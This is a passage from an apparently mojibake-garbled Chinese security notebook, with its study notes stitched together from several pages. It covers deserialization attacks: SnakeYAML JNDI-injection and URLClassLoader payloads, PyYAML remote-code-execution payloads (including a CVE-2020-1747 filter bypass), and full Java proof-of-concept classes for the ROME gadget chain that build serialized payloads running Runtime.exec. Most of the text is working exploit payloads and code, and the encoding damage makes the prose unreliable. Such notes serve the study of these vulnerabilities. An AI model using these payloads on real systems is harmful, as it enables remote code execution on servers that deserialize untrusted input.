[\\\"http://127.0.0.1:8088/\\\"]]]]\"); } } æˆ–è€…æ˜¯æ‰“åŒ…æˆjaråŒ…è¿›è¡ŒåŠ è½½, å‚è€ƒ: https://github.com/artsploit/yaml-payload https://www.cnblogs.com/wangshuo1/p/5697746.html ä¸€å®šè¦æ”¾å…¥META-INF\\services\\javax.script.ScriptEngineFactoryæ‰å¯æ‰§è¡ŒjaråŒ… SPIæœºåˆ¶ å‚è€ƒ: https://www.cnblogs.com/nice0e3/p/14514882.html Javaçš„SPIæœºåˆ¶ï¼Œå®ƒä¼šå»å¯»æ‰¾ç›®æ ‡URLä¸­META-INF/servicesç›®å½•ä¸‹çš„åä¸ºjavax.script.ScriptEngineFactoryçš„æ–‡ä»¶ï¼Œè·å–è¯¥æ–‡ä»¶å†…å®¹å¹¶åŠ è½½æ–‡ä»¶å†…å®¹ä¸­æŒ‡å®šçš„ç±»ã€‚ç¨‹åºä¼šjava.util.ServiceLoderåŠ¨æ€è£…è½½å®ç°æ¨¡å—ï¼Œåœ¨META-INF/servicesç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶å¯»æ‰¾å®ç°ç±»çš„ç±»åï¼Œé€šè¿‡Class.forNameåŠ è½½è¿›æ¥,newInstance()åå°„åˆ›å»ºå¯¹è±¡,å¹¶å­˜åˆ°ç¼“å­˜å’Œåˆ—è¡¨é‡Œé¢ã€‚ è°ƒè¯•å‘ç°ï¼Œåœ¨è°ƒç”¨å®Œå¦‚ä¸‹è°ƒç”¨é“¾è·å–åˆ°ç±»åjavax.script.ScriptEngineManagerä¹‹åï¼Œä¼šè¿”å›åˆ°è°ƒç”¨é“¾ä¸­çš„construct()å‡½æ•°ä¸­è°ƒç”¨è·å–åˆ°çš„æ„é€ å™¨çš„constrcut()æ–¹æ³•ï¼Œç„¶åå°±ä¼šç»§ç»­éå†è§£æå¾—åˆ°yamlæ ¼å¼æ•°æ®å†…çš„java.net.URLClassLoaderç±»åå’Œjava.net.URLç±»åï¼š constructDocument->constructObject->constructObjectNoCheck(æ–°ç‰ˆç»Ÿä¸€ä¸ºconstructObject)->construct->getConstructor->getClassForNode->getClassForName è¿™æ•´ä¸ªæµç¨‹è¿”å›äº†ä¸€ä¸ªåå°„çš„classå¯¹è±¡ protected Class getClassForName(String name) throws ClassNotFoundException { try { return Class.forName(name, true, Thread.currentThread().getContextClassLoader()); } catch (ClassNotFoundException var3) { return Class.forName(name); } } ä»getConstructorå‡ºæ¥åç»§ç»­è·Ÿè¿›constructæ–¹æ³• result = this.getConstructor(node).construct(node); æ­¤æ—¶nodeçš„typeå€¼è¢«æ”¹ä¸º class javax.script.ScriptEngineManager, åœ¨ä¸Šä¸€æ­¥è·å–åå°„å¯¹è±¡å¹¶èµ‹å€¼ç»™clæ—¶, æ‰§è¡Œäº† node.setType(cl); è¿™ä¸€æ­¥, å°†é€šè¿‡åå°„è·å–çš„å¯¹è±¡èµ‹å€¼ç»™ nodeå®ä¾‹ä¸­çš„ this.type, æ‰€ä»¥åœ¨åç»­æ„é€ constructæ„é€ æ—¶è§¦å‘çš„æ˜¯ javax.script.ScriptEngineManager çš„getDeclaredConstructors(æ— å‚æ„é€ ) éšå possibleConstructors å­˜å…¥å‚æ•°ä¹Ÿå°±æ˜¯ public javax.script.ScriptEngineManager(java.lang.ClassLoader), å°†è·å–åˆ°çš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼ºåˆ¶è½¬æ¢ä¸º Constructor ç±»å‹ å›å»éå†è·å–snodeçš„å€¼åå¯¹å…¶ javax.script.ScriptEngineManager(java.lang.ClassLoader) è¿›è¡Œåˆå§‹åŒ–, å…¶ä¸­ argumentList å‚æ•°ä¸º URLClassLoader ç±»å¯¹è±¡ æ¥ç€å°±è°ƒç”¨åˆ° ScriptEngineManager ç±»çš„æ„é€ å‡½æ•°, åœ¨init()ä¸­è°ƒç”¨äº†initEngines()ï¼Œè·Ÿè¿›initEngines()ï¼Œçœ‹åˆ°è°ƒç”¨äº†ServiceLoader , è¿™ä¸ªå°±æ˜¯Javaçš„SPIæœºåˆ¶ åç»­ä¼šè°ƒç”¨åˆ° ServiceLoader.hasNext ç„¶åå°±æ˜¯è·Ÿè¿› ServiceLoader.hasNextService, æ­¤å¤„å°±å›å»è¯»å– META-INF/services/javax.script.ScriptEngineFactory è·å–å®ç°ç±»çš„ä¿¡æ¯ æ¥ç€åœ¨ ServiceLoader$LazyIterator.nextService() å‡½æ•°ä¸­è°ƒ Class.forName() å³é€šè¿‡åå°„æ¥è·å–ç›®æ ‡URLä¸Šçš„ TestEvil.class , æ­¤æ—¶åœ¨WebæœåŠ¡ç«¯ä¼šçœ‹åˆ°è¢«è¯·æ±‚è®¿é—®TestEvil.class çš„è®°å½•, æ¥ç€c.newInstance()å‡½æ•°åˆ›å»ºçš„ TestEvil ç±»å®ä¾‹ä¼ å…¥ javax.script.ScriptEngineManager.cast æ‰§è¡Œ æ¼æ´ä¿®å¤ è¯¥æ¼æ´æ¶‰åŠåˆ°äº†å…¨ç‰ˆæœ¬ï¼Œåªè¦ååºåˆ—åŒ–å†…å®¹å¯æ§,é‚£ä¹ˆå°±å¯ä»¥å»è¿›è¡Œååºåˆ—åŒ–æ”»å‡», æ‰€ä»¥å…¶ä¿®å¤æ–¹æ¡ˆä¸ºåŠ å…¥new SafeConstructor()ç±»è¿›è¡Œè¿‡æ»¤æˆ–æ‹’ç»ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ“ä½œ Yaml yaml = new Yaml(new SafeConstructor()); JdbcRowSetImpl POC1 !!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://127.0.0.1:1099/calc',autoCommit: true} POC2(ç¼©è¿›ä»£è¡¨å±‚çº§å…³ç³», ä¹Ÿå°±æ˜¯com.sun.rowset.JdbcRowSetImpl.dataSourceName) !!com.sun.rowset.JdbcRowSetImpl dataSourceName: 'ldap://127.0.0.1:1099/calc' autoCommit: true SnakeYamlåœ¨è°ƒç”¨Yaml.load()ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨åˆ°JdbcRowSetImplç±»çš„dataSourceNameå±æ€§çš„setteræ–¹æ³•å³setDataSourceName() , åç»­å‡ºå‘ä¸€ç³»åˆ—åˆ©ç”¨é“¾è¾¾åˆ°JNDIæ³¨å…¥ Spring PropertyPathFactoryBean éœ€è¦åœ¨ç›®æ ‡ç¯å¢ƒå­˜åœ¨springframeworkç›¸å…³çš„jaråŒ… org.springframework spring-beans 5.3.14 org.springframework spring-context 5.3.14 POC1 !!org.springframework.beans.factory.config.PropertyPathFactoryBean targetBeanName: \"ldap://127.0.0.1:1099/calc\" propertyPath: ricky beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: [\"ldap://127.0.0.1:1099/calc\"] POC2 !!org.springframework.beans.factory.config.PropertyPathFactoryBean targetBeanName: \"ldap://127.0.0.1:1099/calc\" propertyPath: ricky beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: - \"ldap://127.0.0.1:1099/calc\" POC3 !!org.springframework.beans.factory.config.PropertyPathFactoryBean {targetBeanName: \"ldap://127.0.0.1:1099/calc\", propertyPath: ricky, beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory {shareableResources: [\"ldap://127.0.0.1:1099/calc\"]}} PropertyPathFactoryBeanç±»çš„beanFactoryå±æ€§å¯ä»¥è®¾ç½®ä¸€ä¸ªè¿œç¨‹çš„Factoryï¼Œç±»ä¼¼äºJNDIæ³¨å…¥çš„åŸç†ï¼Œå½“SnakeYamlååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°è¯¥å±æ€§çš„setteræ–¹æ³•ï¼Œé€šè¿‡JNDIæ³¨å…¥æ¼æ´æˆåŠŸå®ç°ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ Spring DefaultBeanFactoryPointcutAdvisor éœ€è¦åœ¨ç›®æ ‡ç¯å¢ƒå­˜åœ¨springframeworkç›¸å…³çš„jaråŒ… POC1 set: ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor adviceBeanName: beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: [] ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor adviceBeanName: \"ldap://127.0.0.1:1099/calc\" beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: [] POC2 set: ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor adviceBeanName: beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: - ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor adviceBeanName: \"ldap://127.0.0.1:1099/calc\" beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: - POC3 set: ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor {adviceBeanName: , beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory {shareableResources: []}} ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor {adviceBeanName: \"ldap://127.0.0.1:1099/calc\", beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory {shareableResources: []}} Apache XBean org.apache.xbean xbean-naming 4.20 org.apache.xbean xbean-reflect 4.15 POC1 !!org.apache.xbean.propertyeditor.JndiConverter {asText: \"ldap://127.0.0.1:1099/calc\"} POC2 !!org.apache.xbean.propertyeditor.JndiConverter asText: \"ldap://127.0.0.1:1099/calc\" POC3 !!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\"foo\",!!javax.naming.Reference [foo, \"test\", \"http://127.0.0.1:8079/\"],!!org.apache.xbean.naming.context.WritableContext []]] Apache Commons Configuration POC set: ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \"ldap://127.0.0.1:1099/calc\"]] C3P0 JndiRefForwardingDataSource POC1 !!com.mchange.v2.c3p0.JndiRefForwardingDataSource jndiName: \"ldap://127.0.0.1:1099/calc\" loginTimeout: 0 POC2 !!com.mchange.v2.c3p0.JndiRefForwardingDataSource {jndiName: \"ldap://127.0.0.1:1099/calc\", loginTimeout: 0} C3P0 WrapperConnectionPoolDataSource POC1 !!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {userOverridesAsString: \"HexAsciiSerializedMap:xxx;\"} POC2 !!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource userOverridesAsString: \"HexAsciiSerializedMap:xxx;\" å…¶ä½™çš„ç±»ä¼¼ fastjson æˆ– jackson çš„JNDIæ³¨å…¥å‡å¯åœ¨yamlä¸­å®ç° URLDNS SnakeYAMLåœ¨è§£æå¸¦é”®å€¼å¯¹çš„é›†åˆçš„æ—¶å€™ä¼šå¯¹é”®è°ƒç”¨hashCodeæ–¹æ³•å› æ­¤ä¼šè§¦å‘DNSè§£æï¼Œå› æ­¤é€šè¿‡æ„é€ URLå¯¹è±¡åé¢ç®€å•åŠ ä¸ª: 1è®©ä»–æˆä¸ºä¸€ä¸ªmapping, æµ‹è¯•java.lang.Stringç±»æ˜¯å¦å­˜åœ¨ å‚è€ƒ: SnakeYAMLå®ç°Gadgetæ¢æµ‹ key: [!!java.lang.String {}: 0, !!java.net.URL [null, \"[http://feycmi.dnslog.cn](http://feycmi.dnslog.cn/)\"]: 1] PyYaml é¢å¤–æ‹“å±•PyYamlçš„çŸ¥è¯† CVE-2020-1747 å‚è€ƒ: https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1 é€šè¿‡yamlæ ¼å¼å¯¹PyYamlè¿›è¡ŒRCE # The `extend` function is overriden to run `yaml.unsafe_load` with # custom `listitems` argument, in this case a simple curl request - !!python/object/new:yaml.MappingNode listitems: !!str '!!python/object/apply:subprocess.Popen [[\"curl\", \"http://127.0.0.1/rce\"]]' state: tag: !!str dummy value: !!str dummy extend: !!python/name:yaml.unsafe_load While the format of python/object/apply can supply states for the object, we can use python/name to reference a python internal function (exec, eval etc). YAMLä¸­ä½¿ç”¨!!åšç±»å‹å¼ºè¡Œè½¬æ¢ # !!python/object/apply # (or !!python/object/new) # args: [ ... arguments ... ] # kwds: { ... keywords ... } # state: ... state ... # listitems: [ ... listitems ... ] # dictitems: { ... dictitems ... } # or short format: # !!python/object/apply [ ... arguments ... ] The 5.3.1 fixes blocked the key extend and ^__.*__$ to disallow setting those key with the state parameter. We discovered that we can use python/object/new with type constructor (type is a typeâ€¦) to create new types with some customized internal state. With this, we can bypass the state key block mechanism and freely set our object to something like this: !!python/object/new:type args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:eval }] With this we can put our commands to listitems, and the constructor will call instance.extend(listitems), thus finish our RCE exploit. !!python/object/new:type args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:eval }] listitems: \"\\x5f\\x5fimport\\x5f\\x5f('os')\\x2esystem('calc\\x2eexe')\" We changed _ to \\x5f and . to \\x2e to bypass the regex limitation tuple&map This is essentially the python code tuple(map(eval, \"PAYLOAD\")), and this works as map and tuple are both class constructor (so it doesnt use any function as apply calls) !!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ '__import__(\"os\").system(\"calc.exe\")' ]]] or like this ä½¿ç”¨ä¸€ä¸ªçŸ­æ¨ªçº¿åŠ ä¸€ä¸ªç©ºæ ¼ä»£è¡¨ä¸€ä¸ªæ•°ç»„é¡¹ !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - [ '__import__(\"os\").system(\"calc.exe\")' ] oor like this !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - - '__import__(\"os\").system(\"calc.exe\")' other RCE ç›´æ¥ä¿®æ”¹ymlæ–‡ä»¶ä¸ºï¼š !!python/object:os.system [\"calc.exe\"] å†è¿è¡Œï¼Œå¤±è´¥ï¼ˆæ˜¾ç¤ºå‚æ•°æœªä¼ é€’ï¼šTypeError: system() takes exactly 1 argument (0 given)ï¼‰ï¼Œå°è¯•æŸ¥çœ‹æºç ã€å¹¶å˜æ¢ymlæ–‡ä»¶ä¸­è¯­å¥æ ¼å¼ï¼Œå‡æœªæˆåŠŸï¼ï¼ˆç–‘éš¾ç‚¹ï¼‰ã€‚ ä¿®æ”¹ä¸ºä»¥ä¸‹2ç§å‡æˆåŠŸï¼Œé€šè¿‡æºç å¾—çŸ¥ï¼Œnewå…¶å®æ˜¯è°ƒç”¨äº†applyï¼Œä»–ä»¬çš„ä¸åŒçš„åœ°æ–¹æ˜¯åˆ›å»ºå¯¹è±¡çš„æ–¹å¼ï¼Œè¿™é‡Œå¯ä»¥å¤§è‡´è®¤ä¸ºå®ƒä»¬æ˜¯ä¸€æ ·çš„ã€‚ !!python/object/apply:os.system [\"calc.exe\"] !!python/object/new:os.system [\"calc.exe\"] ç„¶åå°±æ˜¯å„ç§ç»„åˆçš„payload !!python/object/apply:os.system - \"calc.exe\" !!python/object/new:os.system - \"calc.exe\" è¿˜å¯ä»¥å°è¯•å…¶å®ƒçš„å‘½ä»¤æ‰§è¡Œå‡½æ•° !!python/object/apply:subprocess.check_output [\"calc.exe\"] !!python/object/apply:subprocess.check_output [[\"calc.exe\"]] !!python/object/apply:subprocess.check_output [[calc.exe]] !!python/object/new:subprocess.check_output [\"calc.exe\"] !!python/object/new:subprocess.check_output [[\"calc.exe\"]] !!python/object/new:subprocess.check_output [[calc.exe]] !!python/object/apply:subprocess.Popen [calc.exe] "},"javanote/ROMEé€æ­¥åˆ†æ.html":{"url":"javanote/ROMEé€æ­¥åˆ†æ.html","title":"ROMEé€æ­¥åˆ†æ","keywords":"","body":"ROMEé€æ­¥åˆ†æ å‚è€ƒ: https://blog.csdn.net/weixin_45805993/article/details/121298021 ä¾èµ–: ROME-1.0.jar æ•´ä½“æµç¨‹ TemplatesImpl.getOutputProperties() NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) NativeMethodAccessorImpl.invoke(Object, Object[]) DelegatingMethodAccessorImpl.invoke(Object, Object[]) Method.invoke(Object, Object...) ToStringBean.toString(String) ToStringBean.toString() ObjectBean.toString() EqualsBean.beanHashCode() ObjectBean.hashCode() HashMap.hash(Object) HashMap.readObject(ObjectInputStream) é€šè¿‡hashMapçš„put public V put(K key, V value) { if (key == null) return putForNullKey(value); // è·Ÿè¿›hash int hash = hash(key); ... final int hash(Object k) { int h = 0; if (useAltHashing) { if (k instanceof String) { return sun.misc.Hashing.stringHash32((String) k); } h = hashSeed; } // è·Ÿè¿›hashCodeæ–¹æ³• h ^= k.hashCode(); ... æ­¤å¤„è°ƒç”¨çš„æ˜¯ObjectBeançš„hashCodeæ–¹æ³• public int hashCode() { return this._equalsBean.beanHashCode(); } ObjectBeanæ„é€ æ–¹æ³•ä¹Ÿæç¤ºäº† this._equalsBean = new EqualsBean(beanClass, obj); è·Ÿè¿›EqualsBeançš„beanHashCodeæ–¹æ³• public int beanHashCode() { return this._obj.toString().hashCode(); } è°ƒç”¨ToStringBeançš„toStringæ–¹æ³• public String toString() { Stack stack = (Stack)PREFIX_TL.get(); String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek()); String prefix; if (tsInfo == null) { String className = this._obj.getClass().getName(); prefix = className.substring(className.lastIndexOf(\".\") + 1); } else { prefix = tsInfo[0]; tsInfo[1] = prefix; } // è·Ÿè¿›privateæ–¹æ³• return this.toString(prefix); } private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { // è·å–javax.xml.transform.Templatesçš„getterå’Œsetterå­˜å…¥PropertyDescriptorä¸­ PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i å…³é”®å°±æ˜¯BeanIntrospector.getPropertyDescriptors(_beanClass);è¿™è¡Œä»£ç ï¼Œå®ƒè·å–ç±»çš„å±æ€§çš„getterå’Œsetter è·å–getter/setterçš„é€»è¾‘æ˜¯ï¼Œå…ˆä»_introspectedè¿™ä¸ªHashMapä¸­è·å–(ç›¸å½“äºä¸€ä¸ªç¼“å­˜)ï¼Œä¸€å¼€å§‹è‚¯å®šè·å–ä¸åˆ°ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨getPDsæ–¹æ³•å»è·å–ï¼Œè·å–åˆ°ä¹‹åå†ç¼“å­˜åˆ°_introspectedä¸­ï¼Œè·å–çš„é€»è¾‘æ¯”è¾ƒæ¸…æ™°ï¼Œå’Œå¤§éƒ¨åˆ†è·å–java beançš„getter/setterçš„é€»è¾‘åŸºæœ¬ä¸€æ ·ï¼šå…ˆè·å–æ‰€æœ‰æ–¹æ³•ï¼Œç„¶åæ ¹æ®æ–¹æ³•åæ¥è·å–getterå’Œsetterï¼Œæ¯”å¦‚getterå°±æ˜¯å¼€å¤´æ˜¯\"get\"æˆ–\"is\"ï¼Œç”±äºè¿™é‡Œä¸æ˜¯æ ¹æ®å±æ€§ååŒ¹é…çš„getterï¼Œæ‰€ä»¥åªéœ€è¦è€ƒè™‘å¼€å¤´å°±è¡Œäº†ï¼Œä¸éœ€è¦åŒ¹é…å±æ€§åï¼ŒsetteråŒç†ã€‚è·å–åˆ°getterçš„PropertyDescriptoråï¼Œå»ºç«‹PropertyName(getteråå­—å»æ‰getä¸”ç¬¬å››ä¸ªå­—ç¬¦å°å†™)å’ŒPropertyDescriptorçš„æ˜ å°„å…³ç³»æ”¾å…¥HashMapä¸­ å‡è®¾æˆ‘ä»¬è®¾ç½®çš„_beanClassæ˜¯Templatesï¼Œé‚£ä¹ˆè·å–åˆ°çš„getterå°±åªæœ‰getOutputPropertiesäº†ã€‚ ä¹Ÿå°±æ˜¯è·å–çš„åªæ˜¯javax.xml.transform.Templatesçš„getterå’Œsetter, è€Œjavax.xml.transform.Templatesä¸­åªæœ‰å”¯ä¸€çš„getOutputPropertiesæ–¹æ³•å³å¯è°ƒç”¨åˆ°æ­¤æ–¹æ³• ç„¶åHashMapå¯æ›¿æ¢çš„ç±» // Properties Map properties = new Properties(); properties.put(objectBean, \"anything\"); // Hashtable Map hashtable = new Hashtable(); hashtable.put(objectBean, \"anything\"); ç„¶åToStringBeanä¹Ÿå¯ç›´æ¥ç”¨ObjectBeanä»£æ›¿, å› ä¸ºåˆå§‹åŒ–ObjectBeanæ—¶ä¼šè‡ªåŠ¨ç»™this._toStringBeanèµ‹å€¼ä¸ºToStringBeanå¯¹è±¡, ç›¸å½“äºå˜ç›¸è°ƒç”¨ POC package ROME; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ObjectBean; import com.sun.syndication.feed.impl.ToStringBean; import javassist.ClassPool; import org.apache.commons.codec.binary.Base64; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URLEncoder; import java.util.Map; import java.util.Properties; /** * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMap.hash(Object) * HashMap.readObject(ObjectInputStream) **/ public class ROME { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{ ClassPool.getDefault().get(JDK7u21.Evil.class.getName()).toBytecode() }); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); ObjectBean objectBean = new ObjectBean(String.class,\"ricky\"); // Properties Map properties = new Properties(); properties.put(objectBean, \"anything\"); // Hashtable // Map hashtable = new Hashtable(); // hashtable.put(objectBean, \"anything\"); // HashMap // Map expMap = new HashMap(); // expMap.put(objectBean,\"anything\"); // æ ¹æ®é“¾å­æ¨æ–­å†™æ³• ToStringBean toStringBean = new ToStringBean(Templates.class, templates); EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean); setFieldValue(objectBean,\"_equalsBean\",equalsBean); // ysoserial å†™æ³• // ObjectBean evalBean = new ObjectBean(Templates.class, templates); // setFieldValue(objectBean,\"_equalsBean\",new EqualsBean(ObjectBean.class, evalBean)); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(properties); // oos.writeObject(hashtable); // oos.writeObject(expMap); oos.close(); System.out.println(URLEncoder.encode(Base64.encodeBase64String(barr.toByteArray()))); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } BadAttributeValueExpException å˜å¼ jdk1.8ä¹‹åå¯ä»¥é€šè¿‡BadAttributeValueExpExceptionç±»ç›´æ¥åœ¨readObjectå¤„è§¦å‘toStringæ–¹æ³•, äºæ˜¯é“¾å­ä¹Ÿå°±å˜å¾—ç®€æ´ä¸€äº› TemplatesImpl.getOutputProperties() NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) NativeMethodAccessorImpl.invoke(Object, Object[]) DelegatingMethodAccessorImpl.invoke(Object, Object[]) Method.invoke(Object, Object...) ToStringBean.toString(String) ToStringBean.toString() BadAttributeValueExpException.readObject() POC package ROME; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ToStringBean; import javassist.ClassPool; import org.apache.commons.codec.binary.Base64; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URLEncoder; /** * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * BadAttributeValueExpException.readObject() **/ public class ROME_BadAttributeValueExpException { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{ ClassPool.getDefault().get(JDK7u21.Evil.class.getName()).toBytecode() }); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class, templates); /*jdk1.8*/ BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); setFieldValue(badAttributeValueExpException,\"val\",toStringBean); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(badAttributeValueExpException); oos.close(); System.out.println(URLEncoder.encode(Base64.encodeBase64String(barr.toByteArray()))); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } EqualsBean å˜å¼ å‚è€ƒ: https://www.yuque.com/jinjinshigekeaigui/qskpi5/cz1um4 equalsæ–¹æ³•è°ƒç”¨äº† beanEqualsæ–¹æ³•, é€šè¿‡Hashtable/HashMapçš„equalsè¿›å…¥, å‚è€ƒ CC7 POC package ROME; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.syndication.feed.impl.EqualsBean; import javassist.ClassPool; import org.apache.commons.codec.binary.Base64; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; public class ROME_EqualsBean { public static void main(String[] args) throws Exception{ TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{ ClassPool.getDefault().get(JDK7u21.Evil.class.getName()).toBytecode() }); setFieldValue(templates,\"_name\",\"r\"); setFieldValue(templates,\"_class\",null); // setFieldValue(obj,\"_tfactory\",new TransformerFactoryImpl()); EqualsBean bean = new EqualsBean(String.class,\"r\"); // HashMap map1 = new HashMap(); // HashMap map2 = new HashMap(); // map1.put(\"yy\",bean); // map1.put(\"zZ\",templates); // map2.put(\"zZ\",bean); // map2.put(\"yy\",templates); // Hashtable table = new Hashtable(); // table.put(map1,\"1\"); // table.put(map2,\"2\"); // æµ‹è¯•åå‘ç°å¯ä»¥ç›´æ¥ç”¨HashMap.equal Map hashMap = new HashMap(); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(\"yy\",bean); map1.put(\"zZ\",templates); map2.put(\"zZ\",bean); map2.put(\"yy\",templates); hashMap.put(map1, \"\"); hashMap.put(map2, \"\"); setFieldValue(bean,\"_beanClass\",Templates.class); setFieldValue(bean,\"_obj\",templates); //åºåˆ—åŒ– ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(table); oos.close(); System.out.println(Base64.encodeBase64String(baos.toByteArray())); //ååºåˆ—åŒ– ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{ Field field = obj.getClass().getDeclaredField(fieldname); field.setAccessible(true); field.set(obj,value); } } æè‡´ç¼©çŸ­payload å¯ä»¥å‚è€ƒæ–¹æ³•: å­—èŠ‚å±‚é¢ä¼˜åŒ– javassist ç”Ÿæˆæ¨¡æ¿è€Œä¸å»ç”¨ASMæ“ä½œ ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(\"r\"); CtClass superClass = pool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"); ctClass.setSuperclass(superClass); CtConstructor constructor = CtNewConstructor.make(\"public r(){Runtime.getRuntime().exec(\\\"calc.exe\\\");}\", ctClass); ctClass.addConstructor(constructor); byte[] bytes = ctClass.toBytecode(); ctClass.defrost(); javaåº•å±‚(å½»åº•å°†åŸå…ˆç±»å¤šä½™çš„ç»§æ‰¿å’Œè§„åˆ™å–æ¶ˆï¼Œç›´æ¥ç»§æ‰¿Serializable) å‰”é™¤ TemplatesImpl éƒ¨åˆ†å±æ€§ å­—èŠ‚å±‚é¢ä¼˜åŒ– å‚è€ƒ 4rain å¸ˆå‚…åŸºäºASMå®ç°åˆ é™¤LINENUMBER ï¼Œ4rainå¸ˆå‚…å®ç°äº†å¯¹å­—èŠ‚ç  LINENUMBERæŒ‡ä»¤çš„é˜»æ­¢ä¼ é€’ï¼Œ æå¤§ç¨‹åº¦ç¼©çŸ­äº†payloadé•¿åº¦ã€‚ ä»javaåŸç”Ÿç±»ä¸Šåˆ å‡ åœ¨å‰é¢å‡ ç§åˆ å‡çš„åŸºç¡€ä¸Šï¼Œå‡ ä¹å·²ç»å°†payloadç¼©å°è‡³æè‡´ï¼Œä½†æ˜¯å¯»æ±‚æœ¬è´¨ï¼Œ 